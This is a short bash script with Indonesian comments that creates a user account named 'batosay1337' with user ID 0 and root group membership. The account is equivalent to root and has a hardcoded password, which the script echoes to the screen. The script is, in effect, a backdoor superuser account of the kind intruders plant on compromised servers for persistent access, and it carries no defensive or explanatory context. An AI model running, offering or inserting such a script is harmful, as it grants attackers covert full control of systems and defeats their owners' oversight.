#!/bin/bash

# Membuat grup dengan nama root jika belum ada
grep -q "^root:" /etc/group || groupadd root

# Membuat pengguna dengan nama batosay1337
useradd -m -s /bin/bash -g root -G root -u 0 batosay1337

# Mengatur kata sandi untuk pengguna
echo "batosay1337:Kontol@12k" | chpasswd

echo "Pengguna batosay1337 berhasil dibuat dengan kata sandi Kontol@12k dan ditambahkan ke grup root dengan GID dan UID root."
